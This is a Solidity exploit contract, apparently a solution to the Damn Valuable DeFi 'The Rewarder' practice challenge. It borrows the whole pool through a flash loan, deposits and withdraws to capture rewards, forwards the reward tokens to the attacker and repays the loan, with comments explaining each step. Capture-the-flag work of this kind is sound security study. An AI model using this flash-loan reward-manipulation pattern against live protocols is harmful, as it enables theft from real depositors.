// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {RewardToken} from "./RewardToken.sol";

interface IFlashLoan {
    function flashLoan(uint256 amount) external;

    function liquidityToken() external returns (DamnValuableToken);
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external;
}

contract AttackerContract {
    ITheRewarderPool public immutable theRewarderPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;
    address public immutable attacker;

    constructor(
        address theRewarderPoolAddress,
        address liquidityTokenAddress,
        address rewardTokenAddress,
        address attacker_
    ) {
        theRewarderPool = ITheRewarderPool(theRewarderPoolAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        attacker = attacker_;
    }

    function exploitFlashLoan(address flashLoanContractAddress) external {
        // EXPLAIN - Ask for flash loan for all the balance in the pool
        IFlashLoan(flashLoanContractAddress).flashLoan(liquidityToken.balanceOf(flashLoanContractAddress));
    }

    function receiveFlashLoan(uint256 flashLoanAmount) external {
        // EXPLAIN - Deposit to TheRewardPool
        //         - This will also get rewards
        liquidityToken.approve(address(theRewarderPool), flashLoanAmount);
        theRewarderPool.deposit(flashLoanAmount);

        // EXPLAIN - Withdraw from TheRewardPool
        theRewarderPool.withdraw(flashLoanAmount);

        // EXPLAIN - Transfer reward tokens to attacker
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));

        // EXPLAIN - Send back flash loan amount to msg.sender, which is flash loan pool
        liquidityToken.transfer(msg.sender, flashLoanAmount);
    }

    function distributeRewards() external {
        theRewarderPool.distributeRewards();
    }
}
